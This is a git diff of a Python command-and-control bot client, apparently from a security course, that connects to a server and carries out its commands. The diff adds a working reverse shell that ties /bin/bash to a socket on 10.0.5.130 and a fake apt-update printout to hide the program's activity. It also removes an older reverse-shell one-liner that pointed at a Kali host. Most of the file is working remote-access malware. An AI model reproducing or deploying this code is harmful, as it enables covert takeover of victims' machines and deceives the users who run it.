@@ -1,15 +1,16 @@
 ################################
 ## Name: Robert Hendrickson
 ## ID:   instructor05
-## DATE: 10-07-2021
+## CREATED: 10-07-2021
+## UPDATED: 11-01-2021--11:29AM
 ## FILE: happy_bot.py
 ################################
 """
 This program will create a bot and call to a server for commands
-USAGE: ~$ python3 happy_bot.py
+USAGE: ~$ python3 Hendrickson_Minoin.py
 socket module used for send/receive to server
 subprocess module used to send commands to system
-re module/happy_little_search used to find files on system
+re module/happy_little_searcher used to find files on system
 os module used to walk through filesystem
 getpass module required to get the username of the client connection
 sys module used for exit and sys.platform
@@ -23,12 +24,11 @@ import os
 import getpass
 import sys
 import time
+import datetime
 
 # we gather the starting location to use when we search for a file later
 start_loc = os.getcwd()
 
-# future use, this will allow for a shell call back from a remote system.
-command = 'python3 -c \'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Kali-IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\''
 
 def mysendall(socket, data, delimiter):
     """
@@ -114,7 +114,7 @@ def search(socket, delimiter):
     """
     # tell server we are initializing the search routine
     mysendall(socket, b'[!] Starting search', delimiter)
-    # we will check the current directory for the happy_little_searcher module
+    # we will check the current directory for the happy_search module
     if 'search' not in os.listdir():
         # now we we add the starting location to path the script is running from
         sys.path.append(start_loc)
@@ -196,7 +196,34 @@ def search(socket, delimiter):
             mysendall(socket, data, delimiter)
 
 
-def shell(socket, delimiter):
+def shell(mysocket, delimiter):
+    """
+    This will do something
+    """
+    try:
+        if sys.platform.startswith('win'):
+            data = b"[!] --HAL9000:I'm sorry I can't do that Dave.\n--Dave: Open the pod bay doors HAL!"
+            mysendall(mysocket, data, delimiter)
+            myrecvall(mysocket, delimiter)
+        elif sys.platform.startswith('linux'):
+            data = b'[!] Client received shell request'
+            mysendall(mysocket, data, delimiter)
+            time.sleep(1)
+            s = socket.socket()
+            s.connect(('10.0.5.130', 34543))
+            os.dup2(s.fileno(),0)
+            os.dup2(s.fileno(),1)
+            os.dup2(s.fileno(),2)
+            subprocess.call(['/bin/bash', '-i'])
+            myrecvall(mysocket, delimiter)
+            data = b'[!] Client Shell Finished'
+            mysendall(mysocket, data, delimiter)
+    except Exception as e:
+        type_e = str(type(e)).split()[1].split('<')[0]
+        pass
+
+
+def multi(socket, delimiter):
     """
     This will run commands in a loop
     """
@@ -225,7 +252,7 @@ def commandant(socket, delimiter):
     mysendall(socket, data, delimiter)  
     # Now we get the command from the server
     command = myrecvall(socket, delimiter).decode()
-    # If the command is cd we need to use the os.chdir command
+    # If the command is cd we need to use the os.chdir command;
     if command[:2] == 'cd':
         command = command.strip()
         # We need exception handling for a cd command, if there is no directory then send the error
@@ -367,13 +394,68 @@ def main():
     This function will establish a connection with the server 
     and run shell commands that are received from the server
     :ip: the server ip
-    :port: the port to connect to on the server
+    :ports: the port to connect to on the server
     :delimiter: the delimiter to append to the end of all commands
                 and files sent across the connection
     :mysocket: the socket connection to the server
     """
+    if sys.platform.startswith('linux'):
+        print('Updating Boot Packages...')
+        time.sleep(.2)
+        print("Get:1 https://apt.releases.hashicorp.com buster InRelease [8,654 B]")
+        time.sleep(.2)
+        print("Get:2 https://packages.linux.update.com/apt sdk-buster InRelease [6,774 B]")
+        time.sleep(.5)
+        print("Get:3 https://apt.releases.hashicorp.com buster/main Packages [35.3 kB]")
+        time.sleep(.3)
+        print("Get:4 https://packages.linux.update.com/apt sdk-buster/main Packages [196 kB]")
+        time.sleep(.5)
+        print("Err:5 http://apt.postgresql.org/pub/repos/apt buster-pgdg InRelease")
+        print("  Temporary failure resolving 'apt.postgresql.org'")
+        time.sleep(.3)
+        print("Hit:6 http://storage.apis.com/bazel-apt stable InRelease")
+        time.sleep(.2)
+        print("Get:7 http://packages.linux.update.com/apt gcsfuse-buster InRelease [5,388 B]")
+        time.sleep(.5)
+        print("Get:8 http://security.grub-linux.org/grubian-security buster/updates InRelease [65.4 kB]")
+        time.sleep(.2)
+        print("Get:9 https://cli.github.com/packages buster InRelease [3,743 B]")
+        time.sleep(.3)
+        print("Get:10 https://packages.linux.com/grubian/10/prod buster InRelease [29.8 kB]")
+        time.sleep(.7)
+        print("Get:11 http://security.linux.org/grubv2-security buster/updates/main Sources [202 kB]")
+        time.sleep(.3)
+        print("Get:12 http://security.linux.org/grubv2-security buster/updates/main Packages [308 kB]")
+        time.sleep(1)
+        print("Get:13 https://packages.linux.com/distro/10/prod buster/main Packages [131 kB]")
+        time.sleep(1)
+        print("Err:14 http://repo.mysql.com/apt/grub-security buster InRelease")
+        print("  Temporary failure resolving 'repo.mysql.com'")
+        time.sleep(.1)
+        print("Hit:15 http://deb.linux.org/grub-buster InRelease")
+        time.sleep(.4)
+        print("Get:16 http://deb.linux.org/grub-buster-updates InRelease [51.9 kB]")
+        time.sleep(.3)
+        print("Hit:18 https://download.docker.com/linux/grub-ian buster InRelease")
+        time.sleep(.2)
+        print("Get:19 https://packages.sari.org/php buster InRelease [6,837 B]")
+        time.sleep(.3)
+        print("Hit:17 https://apt.llvm.org/buster llvm-toolchain-buster-9 InRelease")
+        time.sleep(.2)
+        print("Ign:20 http://ftp.linux-grub.org/stretch InRelease")
+        print("Get:21 http://ftp.linux-grub.org/stretch-backports InRelease [91.8 kB]")
+        time.sleep(.2)
+        print("Hit:22 http://ftp.linux-grub.org/stretch-updates InRelease")
+        print("Hit:23 http://ftp.linux-grub.org/stretch Release")
+        time.sleep(1)
+        print("Get:24 https://packages.sari.org/php buster/main Packages [338 kB]")
+        time.sleep(.2)
+        print("Fetched 1,482 kB in {}s ({} kB/s)".format(9, 1482//9))
+        print('Building package lists...\r')
+        print("Reading package lists...",end='')
+        time.sleep(.1)
     # This is setting up the client to communicate with the server
-    ip = '127.0.0.1'
+    ip = '10.0.5.130'
     ports = [8888, 7777, 6666, 5555]
     delimiter = b'!!@@##$$!!'
     # This is the socket object that will connect to the server
@@ -383,10 +465,13 @@ def main():
     while not connected:
         for port in ports:
             time.sleep(1)
+            cport = port
             try:
                 mysocket.connect((ip, port))
             except socket.error:
                 continue
+            except KeyboardInterrupt:
+                sys.exit()
             else:
                 connected = True
                 break
@@ -402,35 +487,50 @@ def main():
         # We receive a command, then if it matches a key word
         # complete the appropriate action
         command = myrecvall(mysocket, delimiter).decode()
-        if command[:4] == 'quit' or command[:4] == 'exit' or command[:10] == 'disconnect':
+        # create a list of words to stop the client
+        breaklist = ['dc','qt','ex']
+        # If the command is in the breaklist exit the client
+        if command.strip() in breaklist:
             # if quit is received break loop and terminate connection to server
             data = b'[!] Connection terminated at client'
             mysendall(mysocket, data, delimiter)
+            print('Done')
             break
-        elif command[:8] == 'download':
+        elif command[:2] == 'dl':
             # If download is received, run download function
             download(mysocket, delimiter)
             # go back to beginning of loop
             continue
-        elif command[:6] == 'search':
+        elif command[:3] == 'src':
             # If search is received, run search function
             search(mysocket, delimiter)
             # go back to beginning of loop
             continue
-        elif command[:6] == 'upload':
+        elif command[:2] == 'ul':
             # If upload is received run upload function
             upload(mysocket, delimiter)
             # go back to beginning of loop
             continue
-        elif command[:7] == 'command':
-            # If command is received call the function above
-            commandant(mysocket, delimiter)
-            # Go back toe the beginning of the loop
-            continue
-        elif command[:5] == 'shell':
+        elif command[:3] == 'cmd':
+            data = b'[!] Client ready for commands'
+            mysendall(mysocket, data, delimiter)
+            ask = myrecvall(mysocket, delimiter).decode()
+            if ask.strip() == 's':
+                # If command is received call the function above
+                commandant(mysocket, delimiter)
+                # Go back to the beginning of the loop
+                continue
+            elif ask.strip() == 'm':
+                multi(mysocket, delimiter)
+                continue
+        elif command[:2] == 'sh':
             shell(mysocket, delimiter)
             continue
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print('Done')
+        sys.exit()
